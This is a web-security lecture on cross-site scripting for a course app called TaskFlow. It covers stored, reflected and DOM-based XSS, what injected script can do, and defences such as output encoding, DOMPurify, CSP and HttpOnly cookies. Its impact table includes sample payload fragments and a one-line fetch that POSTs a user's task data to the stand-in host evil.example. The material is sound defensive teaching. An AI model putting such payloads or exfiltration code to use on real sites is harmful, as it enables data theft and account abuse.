# Lecture 26.01 · What XSS Is: Attacker JavaScript Running in *Your* Origin

> **Section:** S26 · **Type:** 📖 Theory (🛡 Security) · **Track:** ★ Core · **Time:** ~35 minutes
> 🔗 Reference: OWASP, "Cross Site Scripting (XSS)" and the XSS Prevention Cheat Sheet
> ⚠️ All labs in this section run **only against your own local TaskFlow** (`localhost`). Never try them on systems you don't own.

---

## 1. The definition

**Cross-Site Scripting** means an attacker gets **their** JavaScript to run inside **your** page, in your origin (`http://localhost:5173` now, `https://taskflow.example` later).

The browser's security model is the **same-origin policy**: code from `evil.example` can't read TaskFlow's data. XSS skips that entirely. The attacker's code *is* TaskFlow's code, as far as the browser can tell.

## 2. The three kinds

| Kind | The payload travels through | TaskFlow example |
|---|---|---|
| **Stored** | the database: saved once, served to every viewer | a comment body `<img src=x onerror=…>` rendered as HTML (26.03) |
| **Reflected** | the request: a URL parameter echoed into the page | `/search?q=<script>…` echoed by a server template (S40) |
| **DOM-based** | the browser only: JavaScript reads `location.hash` and writes `innerHTML` | 26.07 |

## 3. What attacker code can do in TaskFlow

Assume `alert(1)` runs on `/tasks/5` while alice is logged in:

| Action | Possible? | Why |
|---|---|---|
| Read `document.cookie` | ✅ partly | it sees `XSRF-TOKEN`, `tf_theme`, `tf_lang`, **not** `JSESSIONID` (HttpOnly, 24.07) |
| Call the API as alice | ✅ | `fetch('/api/tasks', { method: 'DELETE', … })`: the browser attaches the session cookie, and the script can read the CSRF cookie and set the header |
| Read alice's data and send it away | ✅ | `fetch('/api/tasks').then(r => r.json()).then(d => fetch('https://evil.example', { method: 'POST', body: JSON.stringify(d) }))` |
| Read the Redux store and the page | ✅ | it's in memory and in the DOM |
| Show a fake "session expired, re-enter password" form | ✅ | phishing on our own domain |
| Keep the session after the tab closes | ❌ | it can't steal `JSESSIONID`. That's the value of HttpOnly |
| Bypass CSRF protection | ✅ | same origin: the CSRF defence assumes no XSS (24.10) |

**XSS is game over for that page.** HttpOnly limits the damage in *time*. It doesn't prevent it.

## 4. The defences, layered

1. **Output encoding by default**: React escapes text (26.02). Never turn it off with user data.
2. **Sanitise** when HTML is truly required: DOMPurify with an allow-list (26.04).
3. **Validate URLs** by protocol (26.06).
4. **Content-Security-Policy**: the browser refuses inline scripts, even if they get in (S40, previewed in 26.11).
5. **HttpOnly** session cookies: limit what a successful XSS can take (24.07).

## ✅ Recap

XSS = their code, your origin. It can do anything alice can do while the page is open. Prevent it with encoding, sanitising and URL checks. Contain it with CSP and HttpOnly.
